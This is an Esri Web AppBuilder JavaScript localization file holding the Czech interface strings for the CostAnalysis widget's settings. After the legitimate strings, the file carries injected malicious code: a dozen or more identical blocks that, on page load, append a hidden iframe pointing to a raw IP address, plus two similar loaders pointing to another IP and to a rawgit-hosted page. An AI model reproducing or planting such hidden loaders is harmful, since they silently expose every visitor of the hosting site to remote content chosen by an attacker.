// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/CostAnalysis/setting/nls/strings":{configText:"Zm\u011bnit text konfigurace:",generalSettings:{tabTitle:"Obecn\u00e1 nastaven\u00ed",measurementUnitLabel:"Jednotky m\u011b\u0159en\u00ed",currencyLabel:"Symbol m\u011b\u0159en\u00ed",roundCostLabel:"Zaokrouhlit n\u00e1klady",projectOutputSettings:"Nastaven\u00ed v\u00fdstupu projektu",typeOfProjectAreaLabel:"Typ oblasti projektu",bufferDistanceLabel:"Velikost obalov\u00e9 z\u00f3ny",roundCostValues:{twoDecimalPoint:"Dv\u011b desetinn\u00e1 m\u00edsta",
nearestWholeNumber:"Nejbli\u017e\u0161\u00ed cel\u00e9 \u010d\u00edslo",nearestTen:"Nejbli\u017e\u0161\u00ed des\u00edtka",nearestHundred:"Nejbli\u017e\u0161\u00ed stovka",nearestThousand:"Nejbli\u017e\u0161\u00ed tis\u00edc",nearestTenThousands:"Nejbli\u017e\u0161\u00ed desetitis\u00edc"},projectAreaType:{outline:"Obrys",buffer:"Obalov\u00e1 z\u00f3na"},errorMessages:{currency:"Neplatn\u00e1 jednotka m\u011bny",bufferDistance:"Neplatn\u00e1 \u0161\u00ed\u0159ka obalov\u00e9 z\u00f3ny",outOfRangebufferDistance:"Hodnota by m\u011bla b\u00fdt v\u011bt\u0161\u00ed ne\u017e 0 a men\u0161\u00ed nebo rovn\u00e1 100"}},
projectSettings:{tabTitle:"Nastaven\u00ed projektu",costingGeometrySectionTitle:"Definujte geografii pro v\u00fdpo\u010det n\u00e1klad\u016f (voliteln\u00e9)",costingGeometrySectionNote:"Pozn\u00e1mka: Konfigurace t\u00e9to vrstvy umo\u017en\u00ed u\u017eivateli nastavit n\u00e1kladov\u00e9 rovnice \u0161ablon prvk\u016f na z\u00e1klad\u011b geografi\u00ed.",projectTableSectionTitle:"Mo\u017enost ukl\u00e1dat a na\u010d\u00edtat nastaven\u00ed projektu (voliteln\u00e9)",projectTableSectionNote:"Pozn\u00e1mka: Nakonfigurov\u00e1n\u00ed v\u0161ech tabulek a vrstev umo\u017en\u00ed u\u017eivateli ulo\u017eit nebo na\u010d\u00edst projekt pro dal\u0161\u00ed pou\u017eit\u00ed.",
costingGeometryLayerLabel:"Geometrick\u00e1 vrstva v\u00fdpo\u010dtu n\u00e1klad\u016f",fieldLabelGeography:"Pole pro ozna\u010den\u00ed geografie",projectAssetsTableLabel:"Tabulka prost\u0159edk\u016f projektu",projectMultiplierTableLabel:"Multiplika\u010dn\u00ed tabulka dodate\u010dn\u00fdch n\u00e1klad\u016f projektu",projectLayerLabel:"Vrstva projektu",configureFieldsLabel:"Konfigurovat pole",fieldDescriptionHeaderTitle:"Pole popisu k\u00f3d\u016f",layerFieldsHeaderTitle:"Pole vrstvy",selectLabel:"V\u00fdb\u011br",
errorMessages:{duplicateLayerSelection:"Vrstva ${layerName} je ji\u017e vybr\u00e1na",invalidConfiguration:"Pros\u00edm vyberte ${fieldsString}"},costingGeometryHelp:"\x3cp\x3eBudou zobrazeny polygonov\u00e9 vrstvy spl\u0148uj\u00edc\u00ed n\u00e1sleduj\u00edc\u00ed podm\u00ednky: \x3cbr/\x3e \x3cli\x3e\tVrstva mus\u00ed m\u00edt mo\u017enost dotazov\u00e1n\u00ed\u009d\x3c/li\x3e\x3cli\x3e\tVrstva mus\u00ed m\u00edt pole GlobalID\x3c/li\x3e\x3c/p\x3e",fieldToLabelGeographyHelp:"\x3cp\x3e\u0158et\u011bzcov\u00e1 a numerick\u00e1 pole vybran\u00e9 vrstvy v\u00fdpo\u010dtu n\u00e1klad\u016f budou zobrazena v rozbalovac\u00edm seznamu Pole pro ozna\u010den\u00ed geografie.\x3c/p\x3e",
projectAssetsTableHelp:"\x3cp\x3eBudou zobrazeny tabulky spl\u0148uj\u00edc\u00ed n\u00e1sleduj\u00edc\u00ed podm\u00ednky: \x3cbr/\x3e \x3cli\x3eTabulka mus\u00ed m\u00edt mo\u017enost \u00faprav, zejm\u00e9na vytvo\u0159it, smazat a aktualizovat\u009d\x3c/li\x3e    \x3cli\x3eTabulka mus\u00ed m\u00edt \u0161est pol\u00ed s p\u0159esn\u00fdm n\u00e1zvem a typem dat:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tAssetGUID (pole typu GUID)\x3c/li\x3e\x3cli\x3e\tCostEquation (\u0159et\u011bzcov\u00e9 pole)\x3c/li\x3e\x3cli\x3e\tScenario (\u0159et\u011bzcov\u00e9 pole)\x3c/li\x3e\x3cli\x3e\tTemplateName (\u0159et\u011bzcov\u00e9 pole)\x3c/li\x3e\x3cli\x3e    GeographyGUID (pole typu GUID)\x3c/li\x3e\x3cli\x3e\tProjectGUID (pole typu GUID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectMultiplierTableHelp:"\x3cp\x3eBudou zobrazeny tabulky spl\u0148uj\u00edc\u00ed n\u00e1sleduj\u00edc\u00ed podm\u00ednky: \x3cbr/\x3e \x3cli\x3eTabulka mus\u00ed m\u00edt mo\u017enost \u00faprav, zejm\u00e9na vytvo\u0159it, smazat a aktualizovat\u009d\x3c/li\x3e    \x3cli\x3eTabulka mus\u00ed m\u00edt p\u011bt pol\u00ed s p\u0159esn\u00fdm n\u00e1zvem a typem dat:\x3c/li\x3e\x3cul\x3e\x3cli\x3e\tDescription (\u0159et\u011bzcov\u00e9 pole)\x3c/li\x3e\x3cli\x3e\tType (\u0159et\u011bzcov\u00e9 pole)\x3c/li\x3e\x3cli\x3e\tValue (pole typu desetinn\u00e9 \u010d\u00edslo s jednoduchou/dvojitou p\u0159esnost\u00ed)\x3c/li\x3e\x3cli\x3e\tCostindex (celo\u010d\u00edseln\u00e9 pole)\x3c/li\x3e\x3cli\x3e   \tProjectGUID (pole typu GUID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e",
projectLayerHelp:"\x3cp\x3eBudou zobrazeny polygonov\u00e9 vrstvy spl\u0148uj\u00edc\u00ed n\u00e1sleduj\u00edc\u00ed podm\u00ednky: \x3cbr/\x3e \x3cli\x3eVrstva mus\u00ed m\u00edt mo\u017enost \u00faprav, zejm\u00e9na vytvo\u0159it, smazat a aktualizovat\u009d\x3c/li\x3e    \x3cli\x3eVrstva mus\u00ed m\u00edt p\u011bt pol\u00ed s p\u0159esn\u00fdm n\u00e1zvem a typem dat:\x3c/li\x3e\x3cul\x3e\x3cli\x3eProjectName (\u0159et\u011bzcov\u00e9 pole)\x3c/li\x3e\x3cli\x3eDescription (\u0159et\u011bzcov\u00e9 pole)\x3c/li\x3e\x3cli\x3eTotalassetcost (pole typu desetinn\u00e9 \u010d\u00edslo s jednoduchou/dvojitou p\u0159esnost\u00ed)\x3c/li\x3e\x3cli\x3eGrossprojectcost (pole typu desetinn\u00e9 \u010d\u00edslo s jednoduchou/dvojitou p\u0159esnost\u00ed)\x3c/li\x3e\x3cli\x3eGlobalID (pole typu GlobalID)\x3c/li\x3e\x3c/ul\x3e \x3c/p\x3e"},
layerSettings:{tabTitle:"Nastaven\u00ed vrstvy",layerNameHeaderTitle:"N\u00e1zev vrstvy",layerNameHeaderTooltip:"Seznam vrstev v map\u011b",EditableLayerHeaderTitle:"Editovateln\u00e9",EditableLayerHeaderTooltip:"Zahrnout vrstvu a jej\u00ed \u0161ablonu do widgetu pro v\u00fdpo\u010det n\u00e1klad\u016f",SelectableLayerHeaderTitle:"Vybrateln\u00e9",SelectableLayerHeaderTooltip:"Geometrii z prvku je mo\u017en\u00e9 pou\u017e\u00edt pro vygenerov\u00e1n\u00ed nov\u00e9 polo\u017eky n\u00e1klad\u016f",
fieldPickerHeaderTitle:"ID projektu (voliteln\u00e9)",fieldPickerHeaderTooltip:"Voliteln\u00e9 pole (\u0159et\u011bzcov\u00e9ho typu) pro ulo\u017een\u00ed ID projektu",selectLabel:"V\u00fdb\u011br",noAssetLayersAvailable:"Ve vybran\u00e9 webov\u00e9 map\u011b nebyla nalezena \u017e\u00e1dn\u00e1 vrstva prost\u0159edk\u016f",disableEditableCheckboxTooltip:"Tato vrstva nem\u00e1 \u017e\u00e1dn\u00e9 mo\u017enosti \u00faprav"},costingInfo:{tabTitle:"Informace o v\u00fdpo\u010dtu n\u00e1klad\u016f",
proposedMainsLabel:"Navrhovan\u00e9 p\u0159\u00edpojky",addCostingTemplateLabel:"P\u0159idat \u0161ablonu v\u00fdpo\u010dtu n\u00e1klad\u016f",manageScenariosTitle:"Spravovat sc\u00e9n\u00e1\u0159e",featureTemplateTitle:"Budouc\u00ed \u0161ablona",costEquationTitle:"N\u00e1kladov\u00e1 rovnice",geographyTitle:"Geografie",scenarioTitle:"Sc\u00e9n\u00e1\u0159",actionTitle:"Akce",scenarioNameLabel:"N\u00e1zev sc\u00e9n\u00e1\u0159e",addBtnLabel:"P\u0159idat",srNoLabel:"Ne.",deleteLabel:"Smazat",duplicateScenarioName:"Duplicitn\u00ed n\u00e1zev sc\u00e9n\u00e1\u0159e",
hintText:"\x3cdiv\x3eN\u00e1pov\u011bda: Pou\u017eijte n\u00e1sleduj\u00edc\u00ed kl\u00ed\u010dov\u00e1 slova\x3c/div\x3e\x3cul\x3e\x3cli\x3e\x3cb\x3e{TOTALCOUNT}\x3c/b\x3e: Pou\u017eije celkov\u00fd po\u010det stejn\u00e9ho typu prost\u0159edk\u016f v geografii\x3c/li\x3e\x3cli\x3e\x3cb\x3e{MEASURE}\x3c/b\x3e: Pro liniov\u00fd prost\u0159edek pou\u017eije d\u00e9lku a pro polygonov\u00fd prost\u0159edek plochu\x3c/li\x3e\x3cli\x3e\x3cb\x3e{TOTALMEASURE}\x3c/b\x3e: Pro liniov\u00fd prost\u0159edek pou\u017eije celkovou d\u00e9lku a pro polygonov\u00fd prost\u0159edek stejn\u00e9ho typu v geografii pou\u017eije celkovou plochu\x3c/li\x3e\x3c/ul\x3eM\u016f\u017eete pou\u017e\u00edt funkce jako:\x3cul\x3e\x3cli\x3eMath.abs(-100)\x3c/li\x3e\x3cli\x3eMath.floor({TOTALMEASURE})\x3c/li\x3e\x3c/ul\x3eUpravte pros\u00edm n\u00e1kladovou rovnici podle pot\u0159eb va\u0161eho projektu.",
noneValue:"\u017d\u00e1dn\u00e1",requiredCostEquation:"Neplatn\u00e1 n\u00e1kladov\u00e1 rovnice pro ${layerName} : ${templateName}",duplicateTemplateMessage:"Pro ${layerName} : ${templateName} existuje duplicitn\u00ed z\u00e1znam v \u0161ablon\u011b",defaultEquationRequired:"Pro ${layerName} : ${templateName} je pot\u0159eba v\u00fdchoz\u00ed rovnice",validCostEquationMessage:"Zadejte pros\u00edm platnou n\u00e1kladovou rovnici",costEquationHelpText:"Upravte pros\u00edm n\u00e1kladovou rovnici podle pot\u0159eb va\u0161eho projektu",
scenarioHelpText:"Vyberte pros\u00edm sc\u00e9n\u00e1\u0159 podle pot\u0159eb va\u0161eho projektu",copyRowTitle:"Kop\u00edrovat \u0159\u00e1dky",noTemplateAvailable:"P\u0159idejte pros\u00edm alespo\u0148 jednu \u0161ablonu pro ${layerName}",manageScenarioLabel:"Spravovat sc\u00e9n\u00e1\u0159",noLayerMessage:"Zadejte pros\u00edm alespo\u0148 jednu vrstvu do ${tabName}",noEditableLayersAvailable:"U vrstev je nutn\u00e9 v kart\u011b nastaven\u00ed vrstvy za\u0161krtnout mo\u017enost \u00faprav"},
statisticsSettings:{tabTitle:"Nastaven\u00ed statistik",addStatisticsLabel:"P\u0159idat statistiky",fieldNameTitle:"Pole",statisticsTitle:"Popisek",addNewStatisticsText:"P\u0159idat nov\u00e9 statistiky",deleteStatisticsText:"Smazat statistiky",moveStatisticsUpText:"P\u0159esunout statistiky nahoru",moveStatisticsDownText:"P\u0159esunout statistiky dol\u016f",selectDeselectAllTitle:"Vybrat v\u0161e"},statisticsType:{countLabel:"Po\u010det",averageLabel:"Pr\u016fm\u011br",maxLabel:"Maximum",minLabel:"Minimum",
summationLabel:"Sou\u010det",areaLabel:"Plocha",lengthLabel:"D\u00e9lka"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});